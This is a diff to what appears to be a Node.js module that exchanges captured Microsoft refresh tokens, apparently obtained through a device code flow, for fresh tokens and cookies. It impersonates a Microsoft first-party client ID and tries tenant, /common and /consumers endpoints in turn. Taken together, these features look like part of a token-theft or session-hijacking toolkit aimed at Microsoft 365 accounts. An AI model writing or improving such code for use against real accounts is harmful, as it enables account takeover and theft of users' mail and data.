@@ -3,11 +3,14 @@ const { encrypt } = require('../utils/encrypt');
 const db = require('../database/connection');
 const config = require('../config/env');
 
-// Microsoft OAuth2 client ID for Office 365 public client
-const MICROSOFT_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+// Use the SAME client_id and tenant from .env that was used to obtain the refresh token
+// This is critical - refresh tokens are bound to the client_id that created them
+const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+const TENANT = config.AZURE_TENANT || 'common';
 
-// Token endpoint URLs
+// Token endpoint URLs - use tenant-specific endpoint
 const TOKEN_ENDPOINTS = {
+  tenant: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
   common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
   consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
 };
@@ -88,10 +91,10 @@ async function exchangeRefreshTokenForCookies(refreshToken) {
   const cookies = [];
   let newRefreshToken = null;
 
-  // Try /common endpoint first (works for work/school accounts)
-  let endpoint = TOKEN_ENDPOINTS.common;
+  // Try tenant-specific endpoint FIRST (this is what the device code flow used)
+  let endpoint = TOKEN_ENDPOINTS.tenant;
   let params = new URLSearchParams({
-    client_id: MICROSOFT_CLIENT_ID,
+    client_id: CLIENT_ID,
     grant_type: 'refresh_token',
     refresh_token: refreshToken,
     scope: 'https://graph.microsoft.com/.default offline_access openid profile',
@@ -99,15 +102,32 @@ async function exchangeRefreshTokenForCookies(refreshToken) {
 
   let response = await axios.post(endpoint, params, {
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    validateStatus: () => true, // Don't throw on 400
+    validateStatus: () => true,
     maxRedirects: 5,
   });
 
-  // If /common fails with invalid_grant, try /consumers (personal accounts)
+  // If tenant-specific fails, try /common
+  if (response.status === 400 && response.data.error === 'invalid_grant') {
+    endpoint = TOKEN_ENDPOINTS.common;
+    params = new URLSearchParams({
+      client_id: CLIENT_ID,
+      grant_type: 'refresh_token',
+      refresh_token: refreshToken,
+      scope: 'https://graph.microsoft.com/.default offline_access openid profile',
+    });
+
+    response = await axios.post(endpoint, params, {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      validateStatus: () => true,
+      maxRedirects: 5,
+    });
+  }
+
+  // If /common fails, try /consumers (personal accounts)
   if (response.status === 400 && response.data.error === 'invalid_grant') {
     endpoint = TOKEN_ENDPOINTS.consumers;
     params = new URLSearchParams({
-      client_id: MICROSOFT_CLIENT_ID,
+      client_id: CLIENT_ID,
       grant_type: 'refresh_token',
       refresh_token: refreshToken,
       scope: 'https://graph.microsoft.com/.default offline_access openid profile',
